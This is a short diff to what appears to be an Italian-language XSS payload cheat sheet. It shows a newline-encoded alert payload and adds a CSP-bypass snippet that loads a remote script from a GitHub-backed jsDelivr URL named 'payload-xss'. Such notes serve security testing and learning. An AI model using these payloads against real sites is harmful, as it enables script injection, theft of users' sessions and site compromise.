@@ -9,7 +9,10 @@
 <i>%0A newline url encoded per mandare a capo il tuo payload. In caso ci sia un commento // %0Aalert(1) </i></br>
 `a%0Aalert('XSS');//`
 
-``
+# bypass csp
+
+<i>script-src https://cdn.jsdelivr.net</i><br>
+`<script src="https://cdn.jsdelivr.net/gh/michele0303/payload-xss@main/jsdelivr-fetch.js"></script>`
 
 ``
 
